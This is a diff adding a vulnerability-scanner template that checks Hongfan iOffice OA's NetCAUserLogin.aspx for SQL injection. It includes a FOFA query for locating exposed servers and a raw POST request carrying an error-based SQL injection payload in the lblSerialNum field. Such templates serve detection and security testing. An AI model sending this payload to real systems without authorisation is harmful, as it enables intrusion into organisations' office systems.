@@ -1,0 +1,36 @@
+id: hongfan-ioffice-NetCAUserLogin-sqli
+info:
+  name: 红帆 ioffice OA NetCAUserLogin.aspx 存在SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/58493/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: title="iOffice.net" || body="/iOffice/js" || body="iOffice.net" || body="iOfficeOcxSetup.exe" || body="Hongfan. All Rights Reserved"
+    tips:
+    repair:
+    version:
+  tags: hongfan,ioffice,sqli
+
+http:
+  - raw:
+      - |
+        POST /ioffice/Identity/NetCAUserLogin.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.2334.76 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=utf-8
+        Content-Length: 567
+        Connection: close
+
+        ioScriptManager1%24ScriptManager1=updatePanel1%7CbtVerify&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTEyMTUyMDIxNTRkZP07H79WIvd3R0It8GvgZeNLQtUV&__VIEWSTATEGENERATOR=65AD83CA&__SCROLLPOSITIONX=0&__SCROLLPOSITIONY=0&lblSerialNum=%27+AND+9176+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289176%3D9176%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28113%29%29%29--+Vgmc&__ASYNCPOST=true&btVerify=
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'qpbbq1qpkvq')
+        condition: and
